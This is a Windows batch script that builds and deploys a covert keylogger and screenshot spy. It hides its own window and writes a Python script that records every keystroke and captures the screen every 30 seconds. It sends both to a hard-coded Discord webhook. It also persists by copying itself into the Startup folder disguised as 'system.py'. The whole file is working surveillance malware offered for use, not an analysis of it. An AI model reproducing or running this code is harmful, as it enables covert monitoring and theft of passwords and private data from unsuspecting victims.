@echo off
:: === FULL SPY - Keys + Screenshots to Discord ===

if "%1"=="hidden" goto :main
mshta "javascript:code( (function(){ var w = window.open('','_blank','width=1,height=1'); w.blur(); window.focus(); })() );"
start "" /b "%~f0" hidden
exit /b

:main
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Python not found. Install it.
    pause
    exit /b
)

pip install pynput requests pillow --quiet >nul 2>&1

> spy.py echo import os
>> spy.py echo import time
>> spy.py echo import threading
>> spy.py echo import requests
>> spy.py echo from pynput.keyboard import Listener
>> spy.py echo from PIL import ImageGrab
>> spy.py echo.
>> spy.py echo DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1515868543147708566/bbBiB3da4qLuFsdI-_y57cO6ogysY2lAfn8AgjttFerA3TfZYWOy_YYzR3XJC-eJnNTI"
>> spy.py echo.
>> spy.py echo if os.name == 'nt':
>> spy.py echo     try:
>> spy.py echo         import ctypes
>> spy.py echo         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
>> spy.py echo     except: pass
>> spy.py echo.
>> spy.py echo buffer = []
>> spy.py echo.
>> spy.py echo def on_press(key):
>> spy.py echo     try: k = key.char
>> spy.py echo     except: k = f"[{key}]"
>> spy.py echo     buffer.append(k)
>> spy.py echo.
>> spy.py echo def send_keys():
>> spy.py echo     while True:
>> spy.py echo         time.sleep(6)
>> spy.py echo         if buffer:
>> spy.py echo             try:
>> spy.py echo                 text = "".join(buffer)
>> spy.py echo                 requests.post(DISCORD_WEBHOOK, json={"content": f"```[{time.strftime('%%H:%%M:%%S')}] {text}```"})
>> spy.py echo                 buffer.clear()
>> spy.py echo             except: pass
>> spy.py echo.
>> spy.py echo def take_screenshot():
>> spy.py echo     while True:
>> spy.py echo         time.sleep(30)
>> spy.py echo         try:
>> spy.py echo             img = ImageGrab.grab()
>> spy.py echo             filename = f"snap_{int(time.time())}.png"
>> spy.py echo             img.save(filename)
>> spy.py echo             with open(filename, "rb") as f:
>> spy.py echo                 requests.post(DISCORD_WEBHOOK, files={"file": (filename, f)})
>> spy.py echo             os.remove(filename)
>> spy.py echo         except: pass
>> spy.py echo.
>> spy.py echo threading.Thread(target=send_keys, daemon=True).start()
>> spy.py echo threading.Thread(target=take_screenshot, daemon=True).start()
>> spy.py echo print("Full spy running - keys + screenshots every 30s")
>> spy.py echo with Listener(on_press=on_press) as l:
>> spy.py echo     l.join()

copy spy.py "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\system.py" >nul 2>&1

start "" pythonw spy.py
echo Spy with screenshots deployed.
pause